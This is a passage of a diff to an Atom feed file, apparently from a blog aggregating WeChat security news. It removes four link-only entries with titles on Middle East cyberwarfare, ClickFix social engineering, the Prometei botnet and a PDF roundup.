     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>中东网络战升级：从黑客行动主义到复杂威胁行动</title>
-    <link href="http://example.com/2025/06/25/weixin_491247232/"/>
-    <id>http://example.com/2025/06/25/weixin_491247232/</id>
-    <published>2025-06-25T06:00:03.930Z</published>
-    <updated>2025-06-25T06:00:03.926Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/obVYkWsmRvTCBTSTnKTLzg">https://mp.weixin.qq.com/s/obVYkWsmRvTCBTSTnKTLzg</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/obVYkWsmRvTCBTSTnKTLzg&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>FileFix、 ClickFix 普通用户应该知道的社工技术</title>
-    <link href="http://example.com/2025/06/25/weixin_673107161/"/>
-    <id>http://example.com/2025/06/25/weixin_673107161/</id>
-    <published>2025-06-25T06:00:02.846Z</published>
-    <updated>2025-06-25T06:00:02.842Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Ih_b2RBAFv2TlcPDBjpERw">https://mp.weixin.qq.com/s/Ih_b2RBAFv2TlcPDBjpERw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Ih_b2RBAFv2TlcPDBjpERw&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Prometei僵尸网络攻击Linux服务器进行加密货币挖矿</title>
-    <link href="http://example.com/2025/06/25/weixin_4140484136/"/>
-    <id>http://example.com/2025/06/25/weixin_4140484136/</id>
-    <published>2025-06-25T05:22:42.018Z</published>
-    <updated>2025-06-25T05:22:42.013Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/PbLMGfnaabKwsDrhGloREQ">https://mp.weixin.qq.com/s/PbLMGfnaabKwsDrhGloREQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/PbLMGfnaabKwsDrhGloREQ&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一周网安优质PDF资源推荐  FreeBuf知识大陆</title>
-    <link href="http://example.com/2025/06/25/weixin_2781266630/"/>
-    <id>http://example.com/2025/06/25/weixin_2781266630/</id>
-    <published>2025-06-25T05:22:41.694Z</published>
-    <updated>2025-06-25T05:22:41.689Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/-ldjDRwgYP1plj5CAV10Aw">https://mp.weixin.qq.com/s/-ldjDRwgYP1plj5CAV10Aw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/-ldjDRwgYP1plj5CAV10Aw&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
